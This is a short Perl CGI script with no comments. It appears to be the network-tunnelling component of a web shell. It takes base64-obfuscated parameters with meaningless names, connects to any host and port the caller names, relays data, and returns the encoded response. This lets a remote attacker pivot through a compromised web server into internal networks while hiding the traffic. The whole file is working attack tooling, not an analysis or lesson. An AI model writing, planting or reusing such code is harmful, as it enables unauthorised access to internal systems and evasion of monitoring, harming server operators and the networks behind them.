#!/usr/bin/perl
use strict;
use warnings;
use CGI;
use MIME::Base64;
use IO::Socket::INET;
use IO::Select;

sub main {
    my $q = CGI->new;

    my $z0 = $q->param('z0') // '';
    if (!$z0) { return; }

    my $action = decode_base64($z0);

    if ($action eq "forward") {
        my $z2 = $q->param('z2') // '';
        my $z3 = $q->param('z3') // '';
        my $z4 = $q->param('z4') // '';
        if (!$z2 || !$z3 || !$z4) { return; }

        my $target_ip = decode_base64($z2);
        my $target_port = decode_base64($z3);
        
        my $data_bytes = decode_base64(decode_base64($z4));

        my $socket = IO::Socket::INET->new(
            PeerAddr => $target_ip,
            PeerPort => $target_port,
            Proto    => 'tcp',
            Timeout  => 3
        );

        if (!$socket) {
            print "{\"status\":\"error\",\"msg\":\"Connect failed\"}";
            return;
        }

        $socket->blocking(0);

        if (defined $data_bytes && length($data_bytes) > 0) {
            syswrite($socket, $data_bytes);
        }

        my $select = IO::Select->new($socket);
        my $response = "";
        my $retry = 0;

        while ($retry < 3) {
            select(undef, undef, undef, 0.05);

            my $has_data = 0;
            
            if ($select->can_read(0.1)) {
                my $buffer;
                while (my $bytes_read = sysread($socket, $buffer, 8192)) {
                    $response .= $buffer;
                    $has_data = 1;
                }
            }

            if ($has_data && length($response) > 0) {
                last;
            }
            $retry++;
        }

        close($socket);

        my $encoded_res = encode_base64($response, "");
        print "{\"status\":\"success\",\"data\":\"$encoded_res\"}";
        return;
    }
}

main();